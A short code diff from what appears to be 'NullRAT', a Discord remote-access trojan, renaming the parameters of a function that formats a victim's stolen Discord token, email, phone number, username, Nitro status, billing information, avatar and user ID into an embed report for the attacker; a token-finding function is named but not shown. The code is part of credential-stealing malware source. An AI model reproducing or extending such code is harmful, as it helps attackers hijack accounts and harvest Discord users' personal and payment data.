@@ -29,17 +29,17 @@ def genEmbed(self, title, timestamp, description=None):
     embed.set_footer( text="NullRAT" )
     return embed
         
-def checked_embeds(self, tk, em, ph, un, ni, bi, av, idqa):
+def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
     embed=discord.Embed(title="Token Info:")
     embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
-    embed.set_thumbnail(url=av)
-    embed.add_field(name="Token", value=f"```{tk}```", inline=False)
-    embed.add_field(name="Username", value=un, inline=True)
-    embed.add_field(name="Nitro", value=ni, inline=True)
-    embed.add_field(name="Billing Info", value=bi, inline=True)
-    embed.add_field(name="ID", value=idqa, inline=True)
-    embed.add_field(name="Phone Number", value=ph, inline=True)
-    embed.add_field(name="Email", value=em, inline=False)
+    embed.set_thumbnail(url=avatar)
+    embed.add_field(name="Token", value=f"```{token}```", inline=False)
+    embed.add_field(name="Username", value=username, inline=True)
+    embed.add_field(name="Nitro", value=nitro, inline=True)
+    embed.add_field(name="Billing Info", value=billing, inline=True)
+    embed.add_field(name="ID", value=userID, inline=True)
+    embed.add_field(name="Phone Number", value=phone, inline=True)
+    embed.add_field(name="Email", value=email, inline=False)
     return embed
 
 def find_token(self):
